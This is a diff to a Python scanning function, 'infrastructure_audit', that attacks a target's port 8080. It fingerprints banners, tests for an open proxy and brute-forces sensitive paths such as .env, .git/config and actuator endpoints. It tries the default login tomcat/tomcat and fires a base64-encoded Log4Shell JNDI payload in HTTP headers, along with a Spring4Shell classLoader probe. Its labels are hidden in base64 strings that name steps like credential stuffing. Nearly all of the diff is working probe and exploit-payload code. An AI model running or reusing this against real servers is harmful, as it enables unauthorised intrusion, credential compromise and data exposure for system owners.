@@ -469,40 +469,71 @@ def infrastructure_audit():
                     print(f"      [*] {_decode('TWVtdWxhaSBTZXJhbmdhbiBQcm9iaW5nIExlYmloIEx1YXMgcGFkYSBQb3J0IDgwODAuLi4=')}")
                     try:
                         p_url = f"http://{domain}:8080/"
-                        
-                        # 0. Audit Insecure HTTP Methods (PUT, DELETE, TRACE)
+
+                        # 1. Banner Grabbing & Deep Fingerprinting
+                        print(f"      [*] {_decode('QmFubmVyIEdyYWJiaW5nICYgRGVlcCBGaW5nZXJwcmludGluZw==')}")
                         try:
-                            r_opt = session.options(p_url, timeout=2)
-                            allowed = r_opt.headers.get('Allow', '')
-                            if any(x in allowed for x in ["PUT", "DELETE", "TRACE"]):
-                                print(f"      |_ Check: Insecure Methods ({allowed.strip()}) [\033[91mVULNERABLE!\033[0m]")
-                            else:
-                                print(f"      |_ Check: HTTP Methods Policy      [\033[92mSAFE\033[0m]")
+                            r_finger = session.get(p_url, timeout=3)
+                            server = r_finger.headers.get('Server', 'Unknown')
+                            powered = r_finger.headers.get('X-Powered-By', 'Unknown')
+                            print(f"      |_ Server: {server} | Technology: {powered}")
+                            
+                            # Check Directory Listing
+                            is_dir = _decode("SW5kZXggb2YgLw==") in r_finger.text
+                            print(f"      |_ Directory Listing Check         : {'[\033[91mVULN\033[0m]' if is_dir else '[\033[92mSAFE\033[0m]'}")
                         except: pass
 
-                        # 1. Cek Kerentanan Directory Listing (Critical Leakage)
-                        r8 = session.get(p_url, timeout=3)
-                        is_dir_list = _decode("SW5kZXggb2YgLw==") in r8.text
-                        status_dir = "[\033[91mVULNERABLE!\033[0m]" if is_dir_list else "[\033[92mSAFE\033[0m]"
-                        print(f"      |_ Check: Directory Listing        {status_dir}")
-                        
-                        # 2. Advanced Path Discovery (Frameworks, CI/CD, Admin Panels)
-                        # Ref: OWASP & Common Wordlists
+                        # 2. Proxy Abuse / Open Proxy Check
+                        print(f"      [*] {_decode('UHJveHkgQWJ1c2UgLyBPcGVuIFByb3h5IENoZWNr')}")
+                        try:
+                            # Mencoba meminta URL eksternal via port 8080 (Proxy Testing)
+                            r_proxy = session.get(p_url, headers={'Host': 'www.google.com'}, timeout=3)
+                            is_proxy = any(x in r_proxy.text.lower() for x in ["google", "window.google"])
+                            print(f"      |_ Open Proxy Vulnerability        : {'[\033[91mVULN\033[0m]' if is_proxy else '[\033[92mSAFE\033[0m]'}")
+                        except: pass
+
+                        # 3. Directory Brute Forcing (Fuzzing Sensitive Paths)
                         attack_paths = [
-                            "manager/html", "phpmyadmin", ".env", "config.php",
+                            "manager/html", "phpmyadmin/", ".env", "config.php",
                             "actuator/env", "actuator/heapdump", "actuator/health",
-                            "solr/", "jenkins/script", "api-docs", "v1/api-docs",
-                            "jmx-console/", "console/", "admin/login"
+                            "jenkins/script", "solr/", "api-docs", "v1/api-docs",
+                            "jmx-console/", "console/", "admin/login", ".git/config"
                         ]
-                        
                         for path in attack_paths:
                             try:
-                                r_path = session.get(p_url + path, timeout=2)
-                                is_found = r_path.status_code == 200
-                                status_p = "[\033[91mVULNERABLE!\033[0m]" if is_found else "[\033[92mSAFE\033[0m]"
-                                print(f"      |_ Check: /{path.ljust(21)} {status_p}")
-                            except:
-                                print(f"      |_ Check: /{path.ljust(21)} [TIMEOUT]")
+                                r_fuzz = session.get(p_url + path, timeout=2)
+                                if r_fuzz.status_code == 200:
+                                    print(f"      |_ Found Sensitive Path            : [\033[91m/{path}\033[0m]")
+                                    
+                                    # 4. Credential Stuffing (Simulated Default Account Check)
+                                    if "manager/html" in path or "phpmyadmin" in path:
+                                        print(f"      [*] {_decode('Q3JlZGVudGlhbCBTdHVmZmluZyAoRGVmYXVsdCBBY2NvdW50IENoZWNrKQ==')}")
+                                        # Simulate Basic Auth for Tomcat Manager (tomcat/tomcat)
+                                        r_auth = session.get(p_url + path, auth=('tomcat', 'tomcat'), timeout=2)
+                                        if r_auth.status_code == 200:
+                                            print(f"      |_ [\033[91m!\033[0m] Default Account Found!   : tomcat/tomcat")
+                            except: pass
+
+                        # 5. Log4Shell (CVE-2021-44228) & Spring4Shell Probing
+                        print(f"      [*] {_decode('TG9nNFNoZWxsL1NwcmluZzRTaGVsbCBQcm9iaW5n')}")
+                        jndi_payload = _decode("JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS9hfQ==")
+                        try:
+                            # Mengirim payload di berbagai header yang biasanya di-log oleh Log4j
+                            headers_to_test = {
+                                'User-Agent': jndi_payload,
+                                'X-Api-Version': jndi_payload,
+                                'X-Forwarded-For': jndi_payload,
+                                'Referer': jndi_payload
+                            }
+                            r_log4j = session.get(p_url, headers=headers_to_test, timeout=3)
+                            # Deteksi Spring4Shell (CVE-2022-22965) via Class Introspection
+                            r_spring = session.get(p_url + "?class.module.classLoader.URLs[0]=0", timeout=2)
+                            if r_spring.status_code == 400: # Typical response for some patched/blocked spring apps
+                                print(f"      |_ Spring4Shell Surface Detected   : [\033[93mPROBE SENT\033[0m]")
+                            else:
+                                print(f"      |_ Injection Payloads Sent         : [\033[92mCOMPLETED\033[0m]")
+                        except: pass
+
                     except: pass
 
                 try:
